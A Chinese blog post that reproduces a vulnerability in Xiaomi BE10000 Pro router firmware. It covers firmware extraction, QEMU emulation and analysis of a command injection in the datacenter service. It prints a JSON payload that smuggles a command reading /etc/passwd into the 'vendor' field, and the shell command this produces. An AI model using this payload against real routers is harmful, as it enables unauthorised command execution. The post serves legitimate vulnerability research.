@@ -1,0 +1,491 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XiaomiBE10000 Pro固件模拟及漏洞复现 | hfddh666's Blog</title><meta name="author" content="hfddh666"><meta name="copyright" content="hfddh666"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XiaomiBE10000 Pro固件模拟及漏洞复现（1.0.70）提取固件 固件下载 https:&#x2F;&#x2F;miuirom.org&#x2F;load?o&#x3D;xiaomi-router-be10000-pro&amp;v&#x3D;1.0.70&amp;l&#x3D;en&amp;t&#x3D;router  首先是binwalk分析一下，发下有个UBI镜像位于0x2f0的位置   查看一下固件头，发现有个HDR1，这个就是小米的固件头，还有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XiaomiBE10000 Pro固件模拟及漏洞复现">
+<meta property="og:url" content="https://hfddh666.github.io/2026/08/22/XiaomiBE10000-Pro%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="hfddh666&#39;s Blog">
+<meta property="og:description" content="XiaomiBE10000 Pro固件模拟及漏洞复现（1.0.70）提取固件 固件下载 https:&#x2F;&#x2F;miuirom.org&#x2F;load?o&#x3D;xiaomi-router-be10000-pro&amp;v&#x3D;1.0.70&amp;l&#x3D;en&amp;t&#x3D;router  首先是binwalk分析一下，发下有个UBI镜像位于0x2f0的位置   查看一下固件头，发现有个HDR1，这个就是小米的固件头，还有">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hfddh666.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-08-22T06:04:25.000Z">
+<meta property="article:modified_time" content="2026-08-23T10:58:54.671Z">
+<meta property="article:author" content="hfddh666">
+<meta property="article:tag" content="Iot">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hfddh666.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "XiaomiBE10000 Pro固件模拟及漏洞复现",
+  "url": "https://hfddh666.github.io/2026/08/22/XiaomiBE10000-Pro%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
+  "image": "https://hfddh666.github.io/img/butterfly-icon.png",
+  "datePublished": "2026-08-22T06:04:25.000Z",
+  "dateModified": "2026-08-23T10:58:54.671Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "hfddh666",
+      "url": "https://hfddh666.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hfddh666.github.io/2026/08/22/XiaomiBE10000-Pro%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XiaomiBE10000 Pro固件模拟及漏洞复现',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="preload" href="/image/top-bg.jpg" as="image"><style>
+  /* 🔥 页面背景：替换为你要的颜色（示例用浅灰蓝 #f5f7fa，可自行修改） */
+  body, html {
+    background: #f5f7fa !important; /* 你可替换成任意颜色值，比如 #f0f2f5、#eef1f5 等 */
+    color: #333 !important;
+  }
+  /* 页面容器：居中+留白 */
+  #content-inner {
+    max-width: 1200px;
+    margin: 30px auto;
+    padding: 0 20px;
+  }
+  /* 文章卡片：保留纯白色 */
+  .recent-post-item {
+    background: #ffffff !important; /* 纯白背景 */
+    border-radius: 16px !important;
+    box-shadow: 0 6px 16px rgba(0,0,0,0.04) !important;
+    padding: 30px !important;
+    margin-bottom: 25px !important;
+    /* 保留左侧暖棕渐变点缀（可选，不喜欢可删除） */
+    border-left: 4px solid;
+    border-image: linear-gradient(to bottom, #e67e22, #d35400) 1 !important;
+    transition: all 0.2s ease;
+    position: relative;
+  }
+  /* 卡片hover效果 */
+  .recent-post-item:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 10px 25px rgba(0,0,0,0.06) !important;
+  }
+  /* 卡片右上角小点缀（可选，不喜欢可删除） */
+  .recent-post-item::after {
+    content: "";
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    width: 12px;
+    height: 12px;
+    background: linear-gradient(45deg, #e67e22, #d35400);
+    border-radius: 50%;
+    opacity: 0.8;
+  }
+  /* 文章标题：深色调 */
+  .post-title {
+    font-size: 22px !important;
+    font-weight: 700 !important;
+    color: #2c3e50 !important;
+    margin-bottom: 12px !important;
+    padding-right: 20px;
+  }
+  /* 文章摘要：中灰色 */
+  .post-excerpt {
+    color: #555 !important;
+    line-height: 1.7 !important;
+    font-size: 15px !important;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    display: -webkit-box;
+    -webkit-line-clamp: 2;
+    -webkit-box-orient: vertical;
+  }
+  /* 发布时间：暖灰色+小图标 */
+  .post-meta {
+    color: #777 !important;
+    font-size: 14px !important;
+    margin-top: 10px !important;
+  }
+  .post-meta:before {
+    content: "📅 ";
+    color: #e67e22;
+  }
+  /* 侧边栏：保留纯白色 */
+  .card-widget {
+    background: #ffffff !important; /* 纯白背景 */
+    border-radius: 16px !important;
+    box-shadow: 0 6px 16px rgba(0,0,0,0.04) !important;
+    padding: 25px !important;
+    margin-bottom: 20px !important;
+  }
+  /* 侧边栏标题：深色调 */
+  .aside-title {
+    font-size: 18px !important;
+    font-weight: 600 !important;
+    padding-bottom: 8px !important;
+    border-bottom: 2px solid #f5f7fa !important; /* 和背景色呼应 */
+    margin-bottom: 15px !important;
+    color: #2c3e50 !important;
+  }
+  /* 标签/分类：浅橙底点缀 */
+  .tag-cloud-list a, .category-list a {
+    background: #fef6e9 !important;
+    color: #e67e22 !important;
+    padding: 4px 12px !important;
+    border-radius: 20px !important;
+    margin: 0 5px 8px 0 !important;
+    display: inline-block !important;
+  }
+  /* 代码块：保留纯白色 */
+  figure.highlight {
+    background: #ffffff !important; /* 纯白背景 */
+    border-radius: 12px !important;
+    padding: 20px !important;
+    margin: 20px 0 !important;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
+    border: none !important;
+  }
+  .highlight code {
+    color: #2c3e50 !important;
+    font-size: 14px !important;
+    line-height: 1.6 !important;
+  }
+  /* 行内代码：保留纯白色 */
+  p code, li code {
+    background: #ffffff !important; /* 纯白背景 */
+    color: #e67e22 !important;
+    padding: 2px 6px !important;
+    border-radius: 4px !important;
+    font-size: 14px !important;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.08) !important;
+  }
+  /* 顶部图加载优化 */
+  #page-header {
+    background-image: url(/image/top-bg.jpg) !important;
+    background-size: cover !important;
+    background-position: center !important;
+    opacity: 1 !important;
+    transition: none !important;
+  }
+  .top-img {
+    background: url(/image/top-bg.jpg) center/cover !important;
+  }
+</style>
+<meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/top-bg.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">hfddh666's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">XiaomiBE10000 Pro固件模拟及漏洞复现</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XiaomiBE10000 Pro固件模拟及漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-08-22T06:04:25.000Z" title="发表于 2026-08-22 14:04:25">2026-08-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-23T10:58:54.671Z" title="更新于 2026-08-23 18:58:54">2026-08-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;本文最后更新于&quot;,&quot;messageNext&quot;:&quot;天前，文中内容可能已过时。&quot;,&quot;postUpdate&quot;:&quot;2026-08-23 18:58:54&quot;}" hidden></div><h1 id="XiaomiBE10000-Pro固件模拟及漏洞复现（1-0-70）"><a href="#XiaomiBE10000-Pro固件模拟及漏洞复现（1-0-70）" class="headerlink" title="XiaomiBE10000 Pro固件模拟及漏洞复现（1.0.70）"></a>XiaomiBE10000 Pro固件模拟及漏洞复现（1.0.70）</h1><h2 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h2><p> <strong>固件下载</strong> <a target="_blank" rel="noopener" href="https://miuirom.org/load?o=xiaomi-router-be10000-pro&v=1.0.70&l=en&t=router">https://miuirom.org/load?o=xiaomi-router-be10000-pro&amp;v=1.0.70&amp;l=en&amp;t=router</a> </p>
+<p>首先是binwalk分析一下，发下有个UBI镜像位于0x2f0的位置</p>
+<img src="/image/1787378788888.png">
+
+<p>查看一下固件头，发现有个HDR1，这个就是小米的固件头，还有一些版本信息之类的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd miwifi_rp04_firmware_85be4_1<span class="number">.0</span><span class="number">.70</span>.<span class="built_in">bin</span> | head -<span class="number">20</span> <span class="comment">#-20是前20行，xxd是将二进制转化为ascii码</span></span><br></pre></td></tr></table></figure>
+
+<img src="/image/1787378939287.png">
+
+<p>然后binwalk解压，发现有两个文件，第二个点到底是空的，那么我们着重分析第一个</p>
+<img src="/image/1787379074372.png">
+
+<p>发现是个完整的ubi镜像</p>
+<img src="/image/1787379147439.png">
+
+<p>UBI镜像是由等大的peb组成，peb开头都是UBI#，所以我们可以知道peb的大小，所以每个大小是128kb，peb大小是用来当binwalk提前失败了来自己手动提取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -t x 2F0.ubi | grep <span class="string">&quot;UBI#&quot;</span> | head -<span class="number">5</span> <span class="comment">#x是输出16进制的意思</span></span><br></pre></td></tr></table></figure>
+
+<img src="/image/1787379250924.png">
+
+<p>然后ubireader提取固件，然后binwalk其中一个发现可以去提取出文件系统</p>
+<img src="/image/1787379620494.png">
+
+<h2 id="固件模拟前分析"><a href="#固件模拟前分析" class="headerlink" title="固件模拟前分析"></a>固件模拟前分析</h2><p>先查看服务类型，发现固件的wweb服务是nginx服务类型</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -executable | grep -E <span class="string">&quot;lighttpd|boa|httpd|nginx|apache|uhttpd|thttpd|micro_httpd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/image/1787379928519.png">
+
+<p>然后是查找有没有inittab文件</p>
+<img src="/image/1787380114757.png">
+
+<p>然后查看，就三行代码，<code>::sysinit:/etc/init.d/rcS S boot</code>这个是系统启动时会执行一次<code>/etc/init.d/rcS</code>脚本，并且传递参数<code>S boot</code>，<code>::shutdown:/etc/init.d/rcS K shutdown</code>这个是系统关机时的运行方式，<code>ttyMSM0::askfirst:/usr/libexec/login.sh</code>就是会询问用户是否启动，启动的话就执行这个login.sh脚本</p>
+<img src="/image/1787380156430.png">
+
+<p>这里我想要对启动脚本进一步分析，但是找不到</p>
+<img src="/image/1787380404380.png">
+
+<p>然后看<code>./etc/init.d/nginx</code>，有个启动服务代码，fcgi-cgi是后端请求的处理器，然后是绑定本地的·8920端口然后是创建必要的目录，执行init_config函数，然后执行一系列指令启动nginx</p>
+<img src="/image/1787380541688.png">
+
+<img src="/image/1787380674870.png">
+
+<p>然后看一下<code>/etc/nginx/nginx.conf</code></p>
+<img src="/image/1787380928168.png">
+
+<p>然后跟进，观察看到端口的配置，服务启动的是nginx，网站目录是&#x2F;www</p>
+<img src="/image/1787380987645.png">
+
+<p> <strong>etc&#x2F;rc.d&#x2F;S80datacenter</strong> ：这里有路由器启动后的执行指令</p>
+<img src="/image/1787381243757.png">
+
+<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>查找busybox看一下架构，qem64小端</p>
+<p><img src="/image/1787381715396.png" alt="1787381715396"></p>
+<p>镜像下载  <a target="_blank" rel="noopener" href="https://cloud.debian.org/images/cloud/bookworm/20260821-2577/">Index of &#x2F;images&#x2F;cloud&#x2F;bookworm&#x2F;20260821-2577</a> </p>
+<p>然后启动</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-aarch64 \</span><br><span class="line">    -m <span class="number">2048</span> \</span><br><span class="line">    -cpu cortex-a53 \</span><br><span class="line">    -M virt,virtualization=true \</span><br><span class="line">    -nographic \</span><br><span class="line">    -drive <span class="keyword">if</span>=none,file=debian-<span class="number">12</span>-nocloud-arm64-<span class="number">20260821</span>-<span class="number">2577.</span>qcow2,<span class="built_in">format</span>=qcow2,<span class="built_in">id</span>=hd0 \</span><br><span class="line">    -device virtio-blk-device,drive=hd0 \</span><br><span class="line">    -netdev tap,<span class="built_in">id</span>=net0,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -device virtio-net-device,netdev=net0 \</span><br><span class="line">    -bios /usr/share/qemu-efi-aarch64/QEMU_EFI.fd</span><br></pre></td></tr></table></figure>
+
+<p>本机设置tap0网卡</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>/<span class="number">24</span> up</span><br></pre></td></tr></table></figure>
+
+<p>然后设置qemu配置，互ping一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 查看当前网络接口</span></span><br><span class="line">ip addr show</span><br><span class="line"><span class="comment"># 2. 配置 eth0 的 IP 地址（对应宿主机 tap0 的 192.168.10.1）</span></span><br><span class="line">ip addr add <span class="number">192.168</span><span class="number">.10</span><span class="number">.2</span>/<span class="number">24</span> dev eth0</span><br><span class="line"><span class="comment"># 3. 启用 eth0 接口</span></span><br><span class="line">ip link <span class="built_in">set</span> eth0 up</span><br><span class="line"><span class="comment"># 4. 配置 br0</span></span><br><span class="line">ip link add br0 <span class="built_in">type</span> dummy</span><br><span class="line">ip addr add <span class="number">192.168</span><span class="number">.10</span><span class="number">.3</span>/<span class="number">24</span> dev br0</span><br><span class="line">ip link <span class="built_in">set</span> br0 up</span><br><span class="line"><span class="comment"># 5. 验证配置</span></span><br><span class="line">ip addr show</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/1787382646508.png" alt="1787382646508"></p>
+<p>然后是传送文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#本地</span></span><br><span class="line">tar -cvf web.tar.gz squashfs-root/</span><br><span class="line">python -m http.server</span><br><span class="line"><span class="comment">#qemu</span></span><br><span class="line">curl -O http://<span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>:<span class="number">8000</span>/web.tar.gz</span><br><span class="line">tar -xvf web.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>然后挂载必要文件夹，启动服务，创建必要文件夹</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd squashfs-root/ </span><br><span class="line">sudo mount -t proc proc proc</span><br><span class="line">sudo mount --rbind /dev dev</span><br><span class="line">sudo mount -t sysfs sysfs sys</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot . sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /var/lib/nginx/body</span><br><span class="line">mkdir -p /var/run</span><br></pre></td></tr></table></figure>
+
+<p>然后是启动后端服务</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/datacenter &gt; /tmp/datacenter.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br></pre></td></tr></table></figure>
+
+<p>前端</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/nginx -c /etc/nginx/nginx.conf &amp;</span><br></pre></td></tr></table></figure>
+
+<p>fcgi-cgi FastCGI 应用服务器部署</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">bin</span>/spawn-fcgi -n -a <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">8920</span> -F <span class="number">1</span> -- /usr/<span class="built_in">bin</span>/fcgi-cgi &lt;/dev/null &gt;/tmp/fcgi.out <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br></pre></td></tr></table></figure>
+
+<p>成功启动</p>
+<p><img src="/image/1787383272245.png" alt="1787383272245"></p>
+<p>然后看登陆界面，<a target="_blank" rel="noopener" href="http://192.168.10.3/cgi-bin/luci/web%EF%BC%8C%E4%BD%86%E6%98%AF%E6%AF%8F%E6%AC%A1%E8%BE%93%E5%85%A5%E5%AE%8C%E9%83%BD%E5%9B%9E%E8%B0%83%E5%88%B0%E4%B8%8A%E9%9D%A2%E8%BF%99%E4%B8%AA%E7%95%8C%E9%9D%A2%EF%BC%8C%E7%9C%8B%E5%8E%9F%E5%9B%A0%E6%98%AF%E8%AF%B4%E8%A6%81%E5%9C%A8%E5%9C%A8/etc/config/xiaoqiang">http://192.168.10.3/cgi-bin/luci/web，但是每次输入完都回调到上面这个界面，看原因是说要在在/etc/config/xiaoqiang</a> 文件加上或替换 option INITTED ‘1’，然后就能返回正确页面了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/option INITTED/d&#x27;</span> + uci <span class="built_in">set</span> xiaoqiang.common.INITTED=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">echo -e <span class="string">&quot;config core &#x27;common&#x27;\n option INITTED &#x27;1&#x27;&quot;</span> &gt; /etc/config/xiaoqiang</span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">killall nginx datacenter spawn-fcgi <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/sbin/datacenter &gt; /tmp/datacenter.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br><span class="line">/usr/sbin/nginx -c /etc/nginx/nginx.conf &amp;</span><br><span class="line">/usr/<span class="built_in">bin</span>/spawn-fcgi -n -a <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">8920</span> -F <span class="number">1</span> -- /usr/<span class="built_in">bin</span>/fcgi-cgi &lt;/dev/null &gt;/tmp/fcgi.out <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/1787384154009.png" alt="1787384154009"></p>
+<p>输入admin登录</p>
+<p><img src="/image/1787384175432.png" alt="1787384175432"></p>
+<p>小米的这个固件仿真起来的页面不得不说是真的高级</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="datacenter"><a href="#datacenter" class="headerlink" title="datacenter"></a>datacenter</h3><p>漏洞位置是在<code>datacenter</code>固件的 <strong>formatExtDisk</strong> 函数</p>
+<img src="/image/1787465858170.png">
+
+<p><code>off_ED6D0(v27, v17, v24, v25, v26);</code> </p>
+<img src="/image/1787467631466.png">
+
+<p>可以看到这个是一个封装的system函数</p>
+<img src="/image/1787467646980.png">
+
+<p>然后往回看，调用 <strong>formatExtDisk</strong>函数的位置在这，这个数字是api的值，发现当其为7时会进入该函数</p>
+<img src="/image/1787467972054.png">
+
+<p>因此，payload可以这样子构造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;api&quot;</span>:<span class="number">7</span>,<span class="string">&quot;dev&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;vendor&quot;</span>:<span class="string">&quot;vuln;(cat /etc/passwd &gt; /tmp/pwn.txt)&amp; #&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>按照上述函数流程，最后system会执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/format_disk vuln;(cat /etc/passwd &gt; /tmp/pwn.txt)&amp; <span class="comment"># a a</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="xqdatacenter-lua"><a href="#xqdatacenter-lua" class="headerlink" title="xqdatacenter.lua"></a>xqdatacenter.lua</h3><p> <code>xqdatacenter.lua</code> 是一个<strong>不安全的请求转发器</strong>。它接收您的HTTP请求，把其中的 <code>payload</code> 参数原样（只做了Base64编码）打包后，转发给本地的 <code>datacenter</code> 服务，而<strong>没有对 payload 内容做任何安全检查</strong>。 </p>
+<p>web的请求服务是通过<code>xqdatacenter.lua</code>来进行转发的</p>
+<p>直接丢进IDA发现解析不出来</p>
+<img src="/image/1787468405968.png">
+
+<p>但是可以看到这个头部是<code>Fat</code>，将其改为<code>Lua</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf <span class="string">&#x27;\x1bLua&#x27;</span> | dd of=xqdatacenter.lua bs=<span class="number">1</span> seek=<span class="number">0</span> count=<span class="number">4</span> conv=notrunc</span><br></pre></td></tr></table></figure>
+
+<img src="/image/1787468511300.png">
+
